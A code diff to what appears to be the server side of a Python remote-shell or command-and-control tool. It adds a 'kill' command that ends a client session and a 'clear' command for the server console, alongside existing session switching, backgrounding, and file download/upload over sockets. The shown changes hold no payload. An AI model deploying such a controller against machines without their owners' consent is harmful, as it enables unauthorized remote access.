@@ -241,7 +241,8 @@ def send_msg(sock: socket.socket, command: str) -> None:
     sock.send((f"{msg_len:<{HEADER_SIZE}}" + command).encode(FORMAT))
 
     # Receive command output from the client side, if relevant
-    if command not in ["quit", "exit", "clear", "bg", "background"] and command[:9] != "download " and command[:7] != "upload ":
+    server_side_keywords = ["quit", "exit", "clear", "bg", "background", "kill"]
+    if command not in server_side_keywords and command[:9] != "download " and command[:7] != "upload ":
         recv_msg(sock, command)
 
 
@@ -279,7 +280,7 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
             if command:
                 send_msg(sock, command)
                 # For certain keywords, run the appropriate action
-                if command in ["quit", "exit"]:  # Quit current client CLI
+                if command in ["quit", "exit", "kill"]:  # Quit current client CLI
                     maintain_session = False
                     break
                 elif command in ["bg", "background"]:
@@ -367,7 +368,9 @@ def handle_connections(s: socket.socket) -> None:
         # User terminal for session handling
         while True:
             command = input(clr("> "))
-            if command == "sessions":
+            if command == "clear":  # Clear server side console screen
+                os.system('cls' if os.name == 'nt' else 'clear')
+            elif command == "sessions":
                 display_sessions()
             elif command[:12] == "sessions -i ":
                 i = command[12:]
